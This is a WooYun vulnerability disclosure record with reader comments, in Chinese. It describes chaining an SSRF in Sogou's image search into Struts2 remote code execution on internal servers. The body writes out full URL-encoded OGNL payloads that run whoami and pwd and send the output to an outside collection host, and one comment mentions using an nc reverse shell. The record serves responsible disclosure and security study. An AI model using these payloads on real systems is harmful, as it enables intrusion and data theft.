{"id": 7488, "wybug_id": "wooyun-2013-041495", "wybug_title": "通过搜狗某搜索功能扫描搜狗内网（续）之攻击内网struts2漏洞主机", "wybug_corp": "搜狗", "wybug_author": "lupin", "wybug_date": "2013-10-30 18:05", "wybug_open_date": "2013-12-14 18:05", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["跳板攻击内网"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-01：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-14：\t细节向公众公开  简要描述： 通过搜狗正常对外搜索服务，攻击搜狗内网存在struts2漏洞的服务器。 详细说明：  几天发布了搜狗的这个漏洞： WooYun: 通过搜狗某搜索功能扫描搜狗内网 通过搜索图片功能可以访问到内网服务器，这次利用这个漏洞作为跳板攻击到了搜狗内部存在struts2漏洞的服务器。   漏洞证明：  在上次提到的漏洞中（ WooYun: 通过搜狗某搜索功能扫描搜狗内网 ），使用图片搜索功能成功判断到了搜狗内部服务器的开放情况，搜集到了大量的服务器ip：\n\n本来觉得除了扫描开放的服务器之外这个应该没有什么其他的利用价值了，不过仔细思考了一番，既然可以通过这个功能访问内网web服务器，那么如果发送一个代用攻击指令的url到了特定的内网服务器上，这个服务器恰好有漏洞，那么是不是就可以用这个搜索功能作为跳板攻击到搜狗内网了呢？那么什么url具有攻击性呢？这里只能提交url，也就是说只能是get请求，于是我想到了前段时间闹得很凶的struts2命令执行漏洞，于是构造下面这样的url：http://pic.sogou.com/ris?query=http%3A%2F%2F192.168.x.x%3A80%2Findex.action%3Fredirect%3A%24%7Bnew%2520java.net.URL%28%27http%3A%2F%2F1.1.1.1%3A80%2Fo.jsp%3F192.168.x.x%27%29.openConnection%28%29.getInputStream%28%29%7D解释一下，因为服务器在内网，而且又是通过这个搜索功能作为跳板，那么我就无法直接看到命令是否执行所以，通过java构造一个http请求，让他把信息get到我远程的jsp文件上去（http://1.1.1.1/o.jsp）,返回的信息就是内网服务器的ip地址。还是用程序跑：\n\n尝试了login.action、index.action，跑了半天没结果，后来想了一下，struts2官网提供过几个示例程序，很多开发人员都把他们部署在服务器上做参考，其中最简单的一个叫struts-blank，就是一个struts2框架的helloworld，于是构造类似这样的url，再跑一次：http://pic.sogou.com/ris?query=http%3A%2F%2F192.168.x.x%3A8080%2Fstruts2-blank%2Findex.action%3Fredirect%3A%24%7Bnew%2520java.net.URL%28%27http%3A%2F%2F1.1.1.1%3A80%2Fo.jsp%3F192.168.x.x%27%29.openConnection%28%29.getInputStream%28%29%7D这次太幸运了，远程的o.jsp成功获得了一个ip地址：\n\n接下来的事情就是针对这个ip构造执行命令的poc了，url如下：http://pic.sogou.com/ris?query=http%3A%2F%2F192.168.x.x%3A8080%2Fstruts2-blank%2Findex.action%3Fredirect%3A%24%7Bnew%2520java.net.URL%28%27http%3A%2F%2F1.1.1.1%3A80%2Fo.jsp%3F%27%252Bnew+java.io.BufferedReader%28new+java.io.InputStreamReader%28new+java.lang.ProcessBuilder%28%7B%27whoami%27%7D%29.start%28%29.getInputStream%28%29%29%29.readLine%28%29%29.openConnection%28%29.getInputStream%28%29%7D就是通过struts2漏洞执行whoami命令，结果o.jsp上收到了命令执行结果：\n\n执行pwd：\n\n如果再变换一些action名称的话，估计还能找到一些存在漏洞的服务器，这里就不搞了，申请奖品啊。   修复方案：  赶紧把图片搜索功能做好访问控制吧，并且内网服务器里面的struts2漏洞也不是说外部利用不到，赶紧升级吧。   版权声明：转载请注明来源 lupin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2013-11-01 10:52 厂商回复： 感谢提供 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-10-30 18:12 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  刮目相看了！    \n     2013-10-30 18:13 |    \t\t一只猿 \t\t\t( 普通白帽子  |\t\t\t        Rank:463 漏洞数:89        | 硬件与无线通信研究方向)\t\t \n  跟随撸主的脚本，，，脚步    \n     2013-10-30 18:13 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  士别三日啊    \n     2013-10-30 18:28 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  @xsser 还记得你在zone提过的想法，现在就有人实现了！    \n     2013-10-30 19:13 |    \t\tMas \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:15        )\t\t \n  狂拽炫酷吊炸天    \n     2013-10-30 19:34 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @Mas @梧桐雨 @一只猿 @疯狗 @xsser 看了楼主的ID，我觉得是卤拼的意思，哎，又想吃卤肉了，真饿。    \n     2013-10-30 19:35 |    \t\tMas \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:15        )\t\t \n  @小胖子 小胖子 你是和我一样的 90KG的屌丝IT男吗？ 一起减肥有兴趣吗？    \n     2013-10-30 19:48 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @Mas 70KG，不屌丝，不IT。    \n     2013-10-30 21:30 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  @Mas @小胖子 妇科医生你不懂？    \n     2013-10-30 21:50 |    \t\tMas \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:15        )\t\t \n  @zzR @小胖子 狂拽炫酷吊炸天    \n     2013-10-30 22:08 |    \t\t基佬库克 \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:15        | 简介什么的是直接爆菊吧..)\t\t \n  标题信息量略大。。    \n     2013-10-30 23:30 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  我去，好给力啊看起来    \n     2013-10-31 08:24 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  无意中发现楼上好几个吃货。。。我会不会被灭口呢？    \n     2013-10-31 08:28 |    \t\tMas \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:15        )\t\t \n  @鬼魅羊羔 一起减肥吗？？？    \n     2013-10-31 09:34 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  @Mas 他？瘦的跟杆儿似的    \n     2013-10-31 10:22 |    \t\tMas \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:15        )\t\t \n  @Coody @Coody 。。看来只有我是胖屌丝    \n     2013-10-31 10:28 |    \t\tCoody  \t\t\t( 核心白帽子 |\t\t\t        Rank:1565 漏洞数:189        | 不接单、不黑产；如遇接单收徒、绝非本人所...)\t\t \n  @Mas 错、你不胖也是个屌丝，哈哈（羊羔让我说的:P）    \n     2013-10-31 14:12 |    \t\t雷锋小号 \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 乌云现在就缺我这种默默顶贴从来不求脸熟的...)\t\t \n  低调奢华有内涵。已火    \n     2013-10-31 14:47 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  猜测DZ思路，struts没猜出来，猜出3个SQL注入和好几个POST注入。。- -||    \n     2013-10-31 15:32 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  结果是误报，蛋疼啊，我的一上午时间就这样浪费鸟。。。    \n     2013-11-01 13:01 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  我大概猜到是哪了    \n     2013-11-05 12:06 |    \t\tdarksn0w \t\t\t( 实习白帽子  |\t\t\t        Rank:62 漏洞数:10        | 无折腾,不生活！)\t\t \n  @Mas 求一起减肥    \n     2013-11-05 12:36 |    \t\tMas \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:15        )\t\t \n  @darksn0w 请加我QQ50487391    \n     2013-11-15 14:01 |    \t\t乌帽子 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:3        | 学习黑客哪家强 | 中国山东找蓝翔 | sql...)\t\t \n  momo关注    \n     2013-11-22 19:02 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  我去，这太他妈牛逼了！    \n     2013-11-22 19:04 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  只给10，洞主你好亏啊。为什么不NC反弹？    \n     2013-11-24 15:33 |    \t\ttxcbg \t\t\t( 普通白帽子  |\t\t\t        Rank:391 漏洞数:53        | 说点什么呢？)\t\t \n  思路很赞啊    \n     2013-11-25 11:26 |    \t\tpossible \t\t\t( 普通白帽子  |\t\t\t        Rank:373 漏洞数:32        | everything is possible!)\t\t \n  好厉害    \n     2013-12-02 11:00 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @wefgod 漏洞作者应该只是做个简单的漏洞证明就好了：）    \n     2013-12-02 11:18 |    \t\tlupin \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:48        | 尊重自己的爱好 远离利益的罪恶)\t\t \n  @疯狗 那天晚了就没深入搞 第二天人家修复了 我就没法深入搞了。。。    \n     2013-12-03 09:45 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @疯狗 理解理解。说的也是，厂商承认了就没有问题了    \n     2013-12-04 09:06 |    \t\t暴暴 \t\t\t( 路人 |\t\t\t        Rank:9 漏洞数:2        | 呃。。。)\t\t \n  。。太NB了。。    \n     2013-12-14 22:30 |    \t\thacker@sina.cn \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:27        | ANONYMOUS)\t\t \n  这样的漏洞值得精华,赞楼主    \n     2013-12-14 23:00 |    \t\tlupin \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:48        | 尊重自己的爱好 远离利益的罪恶)\t\t \n  @hacker@sina.cn 那你给个好评啊 呵呵    \n     2013-12-14 23:31 |    \t\thacker@sina.cn \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:27        | ANONYMOUS)\t\t \n  @lupin 已送,对于精彩的帖子 毫不吝惜.    \n     2013-12-21 10:19 |    \t\tStream \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 低头要有勇气，抬头要有底气!)\t\t \n  这个NB    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}